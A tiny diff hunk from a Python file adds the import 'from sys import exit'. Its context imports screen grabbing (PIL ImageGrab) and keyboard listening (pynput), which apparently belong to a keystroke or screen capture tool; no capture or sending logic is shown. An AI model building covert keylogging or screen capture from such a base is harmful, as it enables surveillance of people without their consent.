@@ -9,6 +9,7 @@ from time import sleep
 from PIL import ImageGrab
 from os.path import exists
 from os import remove
+from sys import exit
 from pynput import keyboard
 __aplhanum = list(string.ascii_letters+string.digits)
 __data = []
